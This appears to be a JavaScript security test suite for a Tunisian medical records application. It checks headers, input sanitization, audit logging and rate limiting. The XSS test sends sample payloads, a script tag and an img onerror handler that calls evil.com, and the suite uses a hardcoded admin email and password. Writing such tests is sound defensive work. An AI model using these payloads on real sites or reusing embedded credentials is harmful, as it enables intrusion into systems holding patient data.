/**
 * Automated Security & Hardening Verification Suite
 */

const assert = require('assert');

const BASE_URL = process.env.BASE_URL || 'http://localhost:4000';

async function testSecurity() {
  console.log('\n======================================================');
  console.log('🛡️  TESTING SAHATN ENTERPRISE SECURITY PACK');
  console.log(`🌐 Base URL: ${BASE_URL}`);
  console.log('======================================================\n');

  let passed = 0;
  let failed = 0;

  async function check(name, fn) {
    try {
      await fn();
      console.log(`  ✅ [PASS] ${name}`);
      passed++;
    } catch (err) {
      console.error(`  ❌ [FAIL] ${name}: ${err.message}`);
      failed++;
    }
  }

  // 1. Check Security Headers
  await check('Security Headers (X-Frame-Options, CSP, Nosniff, no X-Powered-By)', async () => {
    const res = await fetch(`${BASE_URL}/api/health`);
    assert.strictEqual(res.status, 200);

    const headers = res.headers;
    assert.strictEqual(headers.get('x-frame-options'), 'SAMEORIGIN', 'Missing X-Frame-Options');
    assert.strictEqual(headers.get('x-content-type-options'), 'nosniff', 'Missing X-Content-Type-Options');
    assert.strictEqual(headers.get('x-xss-protection'), '1; mode=block', 'Missing X-XSS-Protection');
    assert.ok(headers.get('content-security-policy'), 'Missing Content-Security-Policy');
    assert.strictEqual(headers.get('x-powered-by'), null, 'X-Powered-By should be removed');
    assert.ok(headers.get('ratelimit-limit'), 'RateLimit-Limit should be present');

    const data = await res.json();
    assert.strictEqual(data.security.inpdpAuditCompliance, 'TUNISIE_LOI_2004_63');
  });

  // 2. Anti-XSS Input Sanitization (with valid authentication)
  await check('Anti-XSS Input Sanitization (Strips <script> and dangerous handlers)', async () => {
    const loginRes = await fetch(`${BASE_URL}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'admin@sahatn.tn', password: 'Saha2026!' })
    });
    const loginData = await loginRes.json();
    assert.ok(loginData.token, 'Admin login token required');

    const res = await fetch(`${BASE_URL}/api/patient/documents`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${loginData.token}`
      },
      body: JSON.stringify({
        patientId: 'usr-4410',
        title: 'Bilan Sanguin <script>alert("hacked")</script>',
        notes: '<img src=x onerror="fetch(\'https://evil.com\')"> Rapport sain'
      })
    });
    assert.strictEqual(res.status, 201);
    const data = await res.json();
    assert.strictEqual(data.data.title, 'Bilan Sanguin ', 'Script tags must be stripped');
    assert.ok(!data.data.notes.includes('onerror'), 'Event handler onerror must be stripped');
  });

  // 3. INPDP Medical Audit Trail
  await check('INPDP Audit Trail Logging (Verifies medical access recorded)', async () => {
    // Authenticate as Admin to access protected audit logs
    const loginRes = await fetch(`${BASE_URL}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'admin@sahatn.tn', password: 'Saha2026!' })
    });
    const loginData = await loginRes.json();
    const adminToken = loginData.token;

    const res = await fetch(`${BASE_URL}/api/admin/audit-logs?limit=5`, {
      headers: { 'Authorization': `Bearer ${adminToken}` }
    });
    assert.strictEqual(res.status, 200);
    const data = await res.json();
    assert.strictEqual(data.success, true);
    assert.ok(data.data.length > 0, 'Audit entries must be recorded');

    const latest = data.data[0];
    assert.ok(latest.action, 'Action should be present');
    assert.strictEqual(latest.compliance, 'INPDP_LOI_2004_63');
    assert.ok(latest.tunisTime, 'Local Tunis time should be recorded');
  });

  // 4. Rate Limiting Protection Check
  await check('Rate Limiting Headers on Auth endpoints', async () => {
    const res = await fetch(`${BASE_URL}/api/auth/me`);
    // Even if 401, headers should be present
    const headers = res.headers;
    assert.ok(headers.get('ratelimit-limit'), 'Auth should have RateLimit-Limit');
    assert.ok(headers.get('ratelimit-remaining'), 'Auth should have RateLimit-Remaining');
  });

  console.log('\n======================================================');
  console.log(`🛡️  Security Pack Results: ${passed} passed, ${failed} failed`);
  console.log('======================================================\n');

  if (failed > 0) process.exit(1);
}

testSecurity().catch(err => {
  console.error('Security test runner failed:', err);
  process.exit(1);
});
